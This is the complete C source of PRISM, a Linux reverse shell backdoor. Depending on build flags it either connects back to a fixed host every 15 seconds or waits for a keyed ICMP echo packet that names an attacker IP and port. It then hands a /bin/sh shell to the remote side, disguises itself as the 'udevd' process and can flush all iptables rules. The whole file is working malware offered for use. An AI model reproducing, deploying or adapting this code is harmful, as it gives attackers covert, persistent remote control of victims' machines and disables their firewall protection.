/*
 * PRISM
 * Reverse Shell Backdoor
 * 
 * Copyright (C) 2010-2013 Andrea Fabrizi <andrea.fabrizi@gmail.com>
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.
 *
 */

#include <stdio.h>
#include <sys/types.h> 
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <netdb.h>
#include <unistd.h>
#include <ctype.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <signal.h>

#ifdef STATIC
# define REVERSE_HOST     "10.0.0.1"
# define REVERSE_PORT     19832
# define RESPAWN_DELAY    15
#else
# define ICMP_PACKET_SIZE 1024
# define ICMP_KEY         "p4ssw0rd"
#endif

#define VERSION          "0.5"
#define MOTD             "PRISM v"VERSION" started\n\n# "
#define SHELL            "/bin/sh"
#define PROCESS_NAME     "udevd"

/*
 * Start the reverse shell
 */
void start_reverse_shell(char *bd_ip, unsigned short int bd_port)
{
    int sd;
    struct sockaddr_in serv_addr;
    struct hostent *server;
    
    /* socket() */
    sd = socket(AF_INET, SOCK_STREAM, 0);
    if (sd < 0) 
        return;
    
    server = gethostbyname(bd_ip);
    if (server == NULL)
        return;
    
    bzero((char *) &serv_addr, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    bcopy((char *)server->h_addr, (char *)&serv_addr.sin_addr.s_addr, server->h_length);
    serv_addr.sin_port = htons(bd_port);
    
    /* connect() */
    if (connect(sd,(struct sockaddr *)&serv_addr,sizeof(serv_addr)) < 0) 
        return;
 
    /* motd */   
    write(sd, MOTD, strlen(MOTD));
    
    /* connect the socket to process sdout,stdin and stderr */
    dup2(sd, 0); 
    dup2(sd, 1); 
    dup2(sd, 2);
    
    /* running the shell */
    execl(SHELL, SHELL, (char *)0);
    close(sd);
}

/*
 * Try to flush all iptables rules
 * You can embed here any command you want to be executed from the backdoor :)
 * This commands will be launched before the shell execution
 */
#ifdef IPTABLES
void flush_iptables(void)
{
    system("iptables -X 2> /dev/null");
    system("iptables -F 2> /dev/null");
    system("iptables -t nat -F 2> /dev/null");
    system("iptables -t nat -X 2> /dev/null");
    system("iptables -t mangle -F 2> /dev/null");
    system("iptables -t mangle -X 2> /dev/null");
    system("iptables -P INPUT ACCEPT 2> /dev/null");
    system("iptables -P FORWARD ACCEPT 2> /dev/null");
    system("iptables -P OUTPUT ACCEPT 2> /dev/null");
}
#endif

/*
 * ICMP packet mode
 */
#ifndef STATIC
void icmp_listen(void)
{
    int sockfd,
        n,
        icmp_key_size;
    char buf[ICMP_PACKET_SIZE + 1];
    struct icmp *icmp;
    struct ip *ip;

    icmp_key_size = strlen(ICMP_KEY);
    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    
    /*
     * Waiting for the activation ICMP packet
     */
    while (1) {

        /* get the icmp packet */
        bzero(buf, ICMP_PACKET_SIZE + 1);        
        n = recv(sockfd, buf, ICMP_PACKET_SIZE,0);
        if (n > 0) {    
            ip = (struct ip *)buf;
            icmp = (struct icmp *)(ip + 1);

            /* If this is an ICMP_ECHO packet and if the KEY is correct  */
            if ((icmp->icmp_type == ICMP_ECHO) && (memcmp(icmp->icmp_data,ICMP_KEY, icmp_key_size) == 0)) {
                char bd_ip[16];
                int bd_port;
                
                bd_port = 0;
                bzero(bd_ip, sizeof(bd_ip));
                sscanf((char *)(icmp->icmp_data + icmp_key_size + 1), "%15s %d", bd_ip, &bd_port);
                
                if ((bd_port <= 0) || (strlen(bd_ip) < 7))
                    continue;
                    
                /* Starting reverse shell */
                if (fork() == 0) {
#ifdef IPTABLES
                    flush_iptables();
#endif
                    //printf("->Starting reverse shell (%s:%d)...\n", bd_ip, bd_port);
                    start_reverse_shell(bd_ip, bd_port);
                    exit(EXIT_SUCCESS);
                }
            }
        }
    }
}
#endif

/*
 * main ()
 */
int main(int argc, char *argv[])
{  
    signal(SIGCLD, SIG_IGN); //Prevent child process from becoming zombie process
    chdir("/");

    /* If argv is equal to Inf0, some info will be printed 
     * In this way the "Inf0" string will not be seen in clear text into the binary file :)
     */
    if ((argc == 2) && (argv[1][0] == 'I') && (argv[1][1] == 'n') && (argv[1][2] == 'f') && (argv[1][3] == '0')) {
        fprintf(stdout, " Version:\t\t%s\n"
                        ,VERSION);
#ifdef STATIC        
        fprintf(stdout, " Mode:\t\t\tstatic\n"
                        " Host:\t\t\t%s\n"
                        " Port:\t\t\t%d\n"
                        " Respawn Delay:\t\t%d sec\n"
                        ,REVERSE_HOST, REVERSE_PORT, RESPAWN_DELAY);
#else
        fprintf(stdout, " Mode:\t\t\ticmp\n"
                        " Key:\t\t\t%s\n"
                        ,ICMP_KEY);
#endif

#ifndef NORENAME
        fprintf(stdout, " Process name:\t\t%s\n", PROCESS_NAME);
#endif

        fprintf(stdout, " Shell:\t\t\t%s\n", SHELL);
        
#ifdef DETACH
        fprintf(stdout, " Detach:\t\tYes\n");
#else
        fprintf(stdout, " Detach:\t\tNo\n");
#endif

#ifdef IPTABLES
        fprintf(stdout, " Flush Iptables:\tYes\n");
#else
        fprintf(stdout, " Flush Iptables:\tNo\n");
#endif

        exit(EXIT_SUCCESS);
    }

#ifndef NORENAME
    int i;
    /* Renaming the process */
    strncpy(argv[0], PROCESS_NAME, strlen(argv[0]));
    for (i=1; i<argc; i++)
        memset(argv[i],' ', strlen(argv[i]));
#endif

#ifdef DETACH
    if (fork() != 0)
        exit(EXIT_SUCCESS);
#endif
    
#ifdef STATIC
    while (1) {
    
#ifdef IPTABLES
        flush_iptables();
#endif

        /* Starting reverse shell */
        if (fork() == 0) {
            start_reverse_shell(REVERSE_HOST, REVERSE_PORT);
            exit(EXIT_SUCCESS);
        }
        sleep(RESPAWN_DELAY);
    }
#else
    /* We need root privilegies to read ICMP packets! */
    if (getgid() != 0) {
        fprintf(stdout, "I'm not root :(\n");
        exit(EXIT_FAILURE);
    }    
    icmp_listen();
#endif

    return EXIT_SUCCESS;
}
